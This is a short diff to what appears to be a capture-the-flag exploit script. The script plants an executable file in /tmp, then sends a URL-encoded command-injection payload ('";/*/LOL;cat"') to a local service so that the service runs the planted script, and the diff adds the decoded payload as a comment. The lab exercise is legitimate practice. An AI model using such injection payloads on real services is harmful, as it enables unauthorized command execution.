@@ -2,3 +2,5 @@ echo 'getflag > /tmp/LOL' > /tmp/LOL
 chmod +x /tmp/LOL
 curl "http://127.0.0.1:4646/?first=%22%3B%2F*%2FLOL%3Bcat%22&second="
 cat /tmp/LOL
+
+# ";/*/LOL;cat"
